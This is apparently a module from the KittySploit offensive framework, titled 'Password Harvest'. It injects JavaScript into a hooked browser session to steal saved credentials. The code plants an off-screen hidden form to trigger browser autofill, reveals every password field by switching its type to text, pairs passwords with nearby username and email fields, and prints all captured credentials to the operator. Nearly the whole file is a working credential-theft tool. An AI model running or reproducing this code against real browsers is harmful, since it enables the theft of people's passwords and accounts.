from kittysploit import *
import json
import time

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Password Harvest",
		"description": "Extract saved passwords from browser autofill by revealing hidden password fields",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}	

	wait_time = OptInteger(3, "Time to wait for autofill to trigger (seconds)", False)
	scan_all_forms = OptString("true", "Scan all forms on the page (true/false)", False)

	def run(self):
		"""Extract passwords from browser autofill"""
		
		code_js = """
		(function() {
			const results = {
				forms: [],
				credentials: []
			};
			
			try {
				// Find all forms on the page
				const forms = document.querySelectorAll('form');
				
				if (forms.length === 0) {
					// Create a hidden form to trigger autofill
					const hiddenForm = document.createElement('form');
					hiddenForm.style.position = 'absolute';
					hiddenForm.style.left = '-9999px';
					hiddenForm.style.top = '-9999px';
					
					const usernameInput = document.createElement('input');
					usernameInput.type = 'text';
					usernameInput.name = 'username';
					usernameInput.autocomplete = 'username';
					usernameInput.id = 'ks_username';
					
					const passwordInput = document.createElement('input');
					passwordInput.type = 'password';
					passwordInput.name = 'password';
					passwordInput.autocomplete = 'current-password';
					passwordInput.id = 'ks_password';
					
					const emailInput = document.createElement('input');
					emailInput.type = 'email';
					emailInput.name = 'email';
					emailInput.autocomplete = 'email';
					emailInput.id = 'ks_email';
					
					hiddenForm.appendChild(usernameInput);
					hiddenForm.appendChild(passwordInput);
					hiddenForm.appendChild(emailInput);
					document.body.appendChild(hiddenForm);
					
					// Focus on username to trigger autofill
					usernameInput.focus();
					
					results.forms.push({
						type: 'hidden_created',
						username_id: 'ks_username',
						password_id: 'ks_password',
						email_id: 'ks_email'
					});
				} else {
					// Scan existing forms
					forms.forEach((form, index) => {
						const formData = {
							index: index,
							action: form.action || '',
							method: form.method || 'get',
							inputs: []
						};
						
						const inputs = form.querySelectorAll('input');
						inputs.forEach(input => {
							const inputData = {
								type: input.type,
								name: input.name || '',
								id: input.id || '',
								autocomplete: input.autocomplete || '',
								value: input.type === 'password' ? '[HIDDEN]' : input.value
							};
							formData.inputs.push(inputData);
						});
						
						results.forms.push(formData);
					});
				}
				
				return JSON.stringify(results);
			} catch (e) {
				return JSON.stringify({
					error: e.message,
					forms: [],
					credentials: []
				});
			}
		})();
		"""
		
		print_status("Scanning page for forms and password fields...")
		initial_result = self.send_js_and_wait_for_response(code_js, timeout=5.0)
		
		if not initial_result:
			print_error("Failed to scan page for forms")
			return False
		
		try:
			initial_data = json.loads(initial_result)
			forms = initial_data.get('forms', [])
			
			if not forms:
				print_warning("No forms found on the page")
				return False
			
			print_success(f"Found {len(forms)} form(s) on the page")
			
			# Wait for autofill to potentially trigger
			if self.wait_time > 0:
				print_status(f"Waiting {self.wait_time} second(s) for autofill to trigger...")
				time.sleep(self.wait_time)
			
			# Now extract the actual values
			extract_js = """
			(function() {
				const credentials = [];
				
				try {
					// Check hidden form if it was created
					const hiddenUsername = document.getElementById('ks_username');
					const hiddenPassword = document.getElementById('ks_password');
					const hiddenEmail = document.getElementById('ks_email');
					
					if (hiddenUsername && hiddenPassword) {
						const username = hiddenUsername.value || '';
						const password = hiddenPassword.value || '';
						const email = hiddenEmail ? hiddenEmail.value || '' : '';
						
						if (username || password || email) {
							credentials.push({
								source: 'hidden_form',
								username: username,
								password: password,
								email: email
							});
						}
					}
					
					// Scan all password fields and reveal them
					const passwordFields = document.querySelectorAll('input[type="password"]');
					passwordFields.forEach((pwdField, index) => {
						// Temporarily change type to text to reveal password
						const originalType = pwdField.type;
						pwdField.type = 'text';
						
						const password = pwdField.value || '';
						
						// Find associated username/email field
						let username = '';
						let email = '';
						
						// Try to find username field in the same form
						const form = pwdField.form;
						if (form) {
							const usernameFields = form.querySelectorAll('input[type="text"], input[type="email"], input[name*="user"], input[name*="login"], input[name*="email"]');
							if (usernameFields.length > 0) {
								username = usernameFields[0].value || '';
							}
						}
						
						// Try to find by common patterns
						if (!username) {
							const prevInput = pwdField.previousElementSibling;
							if (prevInput && (prevInput.type === 'text' || prevInput.type === 'email')) {
								username = prevInput.value || '';
							}
						}
						
						if (password) {
							credentials.push({
								source: `password_field_${index}`,
								username: username,
								password: password,
								email: email,
								field_name: pwdField.name || '',
								field_id: pwdField.id || ''
							});
						}
						
						// Restore original type
						pwdField.type = originalType;
					});
					
					// Also check for any visible password fields that might have been auto-filled
					const allInputs = document.querySelectorAll('input');
					allInputs.forEach(input => {
						if (input.type === 'text' && input.value && 
						    (input.name && (input.name.toLowerCase().includes('pass') || 
						                    input.name.toLowerCase().includes('pwd')))) {
							credentials.push({
								source: 'visible_password_field',
								username: '',
								password: input.value,
								field_name: input.name || '',
								field_id: input.id || ''
							});
						}
					});
					
					return JSON.stringify({
						credentials: credentials,
						count: credentials.length
					});
				} catch (e) {
					return JSON.stringify({
						error: e.message,
						credentials: [],
						count: 0
					});
				}
			})();
			"""
			
			print_status("Extracting password values...")
			extract_result = self.send_js_and_wait_for_response(extract_js, timeout=5.0)
			
			if not extract_result:
				print_error("Failed to extract password values")
				return False
			
			extract_data = json.loads(extract_result)
			credentials = extract_data.get('credentials', [])
			count = extract_data.get('count', 0)
			
			if count == 0:
				print_warning("No passwords found in autofill or password fields")
				return True
			
			print_success(f"Found {count} credential(s):")
			print_info("=" * 80)
			
			for i, cred in enumerate(credentials, 1):
				print_info(f"Credential #{i}:")
				print_info(f"  Source: {cred.get('source', 'unknown')}")
				
				if cred.get('username'):
					print_success(f"  Username: {cred.get('username')}")
				if cred.get('email'):
					print_success(f"  Email: {cred.get('email')}")
				if cred.get('password'):
					print_success(f"  Password: {cred.get('password')}")
				if cred.get('field_name'):
					print_info(f"  Field Name: {cred.get('field_name')}")
				if cred.get('field_id'):
					print_info(f"  Field ID: {cred.get('field_id')}")
				
				print_info("-" * 80)
			
			# Print JSON summary
			print_info("=" * 80)
			print_status("Full credentials data (JSON):")
			print_info(json.dumps(credentials, indent=2))
			
			return True
			
		except json.JSONDecodeError as e:
			print_error(f"Failed to parse form data: {e}")
			print_debug(f"Raw response: {initial_result}")
			return False
		except Exception as e:
			print_error(f"Error processing password harvest: {e}")
			return False
